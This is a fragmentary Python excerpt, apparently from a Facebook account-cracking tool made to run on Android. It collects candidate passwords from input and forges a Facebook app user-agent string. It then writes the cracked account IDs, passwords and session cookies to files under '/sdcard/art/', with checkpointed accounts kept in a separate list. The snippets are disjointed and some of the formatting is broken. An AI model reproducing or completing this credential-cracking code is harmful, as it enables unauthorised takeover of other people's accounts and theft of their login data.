...
self.passwords.append(input(f' {green} {reset}InputPassword: {1 + x}: '))
...
fbbd = 'Samsung'
user_agent = f" Dalvik/1.6.0 (Linux; U; {android_version}; {model_} Build/ {build}) " \ f"[FBAN/ {fban};FBAV/ {facebook_version};FBBV/ {fbbv};FBDM/ {{density= {density:.1f},width= {width},height= {height}}};FBLC/it_IT;FBRV/ {fbrv};FBCR/ {fbcr};FBMF/ {model_};FBBD/ {fbbd};FBPN/ {fbpn};FBDV/ {model_.replace(' ', '_')};FBSV/ {fbsv};FBOP/1;FBCA/x86:armeabi-v7a;FBNT/ {network_type};FBCN/ {network_carrier};FBSR/ {ip_address};]"
...
open('/sdcard/art/art-ok-with-cookies.txt','a').write(str(uid_pw))
open('/sdcard/art/art-ok.txt','a').write(f' {
  uid
}| {
  pw
}\n')
...
open('/sdcard/art/art-cp.txt','a').write(f' {
  uid
}| {
  pw
}\n')
